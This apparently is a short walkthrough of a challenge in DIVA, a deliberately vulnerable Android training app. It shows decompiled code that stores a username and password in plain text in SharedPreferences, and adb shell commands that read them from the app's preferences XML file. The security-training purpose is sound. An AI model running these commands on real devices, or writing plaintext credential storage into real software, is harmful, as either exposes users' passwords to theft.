## Insecure Data Storage Part 1

#### The vulnerability

As shown in the code, the username and password entered into the code is being stored directly into the xml file located in the shared_prefs directory

    public void saveCredentials(View view) {
        SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences((Context)this).edit();
        view = (EditText)this.findViewById(2131493000);
        EditText editText = (EditText)this.findViewById(2131493001);
        editor.putString("user", view.getText().toString());
        editor.putString("password", editText.getText().toString());
        editor.commit();
        Toast.makeText((Context)this, (CharSequence)"3rd party credentials saved successfully!", (int)0).show();
    }
    
#### The exploit

To obtain the password, 
do
      adb shell
      cd /data/data/jakhar.aseem.diva/shared_prefs
      cat  jakhar.aseem.diva_preferences.xml
in the terminal
